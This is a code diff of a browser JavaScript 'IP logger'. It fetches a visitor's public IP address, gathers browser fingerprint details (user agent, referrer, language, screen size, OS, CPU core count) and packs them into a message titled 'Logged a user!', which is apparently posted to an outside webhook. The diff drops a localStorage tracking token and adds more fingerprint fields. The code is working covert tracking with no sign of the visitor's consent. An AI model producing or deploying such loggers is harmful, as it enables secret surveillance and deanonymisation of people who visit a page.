@@ -1,8 +1,4 @@
 async function get_ip() {
-	if (localStorage.token == undefined) {
-		localStorage.setItem('token', Math.floor(Math.random() * 9999));
-	}
-
 	let req = await fetch('https://ipv4.icanhazip.com');
 	let res = await req.text();
 	return res;
@@ -10,14 +6,14 @@ async function get_ip() {
 get_ip().then((ip) => {
 	let useragent = navigator.userAgent;
 
-	let key = localStorage.token;
-
 	let height = window.screen.height;
 	let width = window.screen.width;
 
 	let gpu = navigator.hardwareConcurrency;
 
 	let cookies = navigator.cookieEnabled;
+	let name = navigator.product;
+	let code = navigator.appCodeName;
 	let lang = navigator.language;
 
 	let os = navigator.platform;
@@ -38,26 +34,28 @@ get_ip().then((ip) => {
 					color: '19474160',
 					title: 'Logged a user!',
 					description: `**IP Address:**
-\`${ip}\`
+${ip}
 ------------------------------------------------------
 **Browser data:**
 
 Useragent: 
-\`${useragent}\`
+${useragent}
 
-Refferer: \`${refferer}\`
-Cookies enabled: \`${cookies}\`
+Refferer: ${refferer}
+Browser language: ${lang}
+Cookies enabled: ${cookies}
+Browser engine: ${name}
+Browser code: ${code}
+------------------------------------------------------
+**Screen details:**
+Size: ${width} x ${height}
 ------------------------------------------------------
 **Specs:**
-Operating system: \`${os} \`
+Operating system: ${os} 
 
 *GPU:*
-Core count: \`${gpu}\`
-------------------------------------------------------
-**Identifiers:**
-Browser language: \`${lang}\`
-Screen details: \`${width} x ${height}\`
-Localstorage key: \`${key}\``,
+Core count: ${gpu}
+------------------------------------------------------`,
 				},
 			],
 		};
@@ -66,4 +64,3 @@ Localstorage key: \`${key}\``,
 	}
 	sendMessage();
 });
-
